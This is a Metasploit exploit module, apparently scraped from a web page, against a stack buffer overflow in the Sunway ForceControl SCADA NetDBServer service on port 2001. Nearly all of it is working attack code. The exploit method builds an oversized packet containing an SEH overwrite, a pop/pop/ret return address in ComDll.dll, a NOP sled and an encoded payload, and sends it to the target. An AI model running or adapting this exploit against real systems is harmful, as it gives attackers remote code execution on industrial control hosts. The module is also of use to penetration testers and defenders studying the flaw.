# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based buffer overflow found in the SNMP
                NetDBServer service of Sunway Forcecontrol <= 6.1 sp3. The overflow is
                triggered when sending an overly long string to the listening service
                on port 2001.
            },
            &#039;Author&#039;         => [
                        &#039;Luigi Auriemma&#039;, # original discovery
                        &#039;Rinat Ziyayev&#039;,
                        &#039;James Fitts&#039;
                    ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;49747&#039; ],
                    [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/forcecontrol_1-adv.txt&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => &#039;true&#039;,
                    &#039;BadChars&#039; => "\x0a\x0d\xae",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        # p/p/r ComDll.dll
                        &#039;Windows&#039;, {  &#039;Ret&#039; => 0x100022c4 }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Sep 22 2011&#039;))
        register_options(
            [
                Opt::RPORT(2001)
            ], self.class )
    end
    def exploit
        connect
        header =  "\xeb\x50\xeb\x50"
        header << "\x57\x00"  # packet type
        header << "\xff\xff\x00\x00"
        header << "\x01\x00"
        header << "\xff"
        footer = "\r\n"
        packet = rand_text_alpha_upper(65535)
        packet[0,header.length] = header
        packet[293,8] = generate_seh_record(target.ret)
        packet[301,20] = make_nops(20)
        packet[321,payload.encoded.length] = payload.encoded
        packet[65533,2] = footer
        print_status("Trying target %s..." % target.name)
        sock.put(packet)
        handler
        disconnect
    end
end



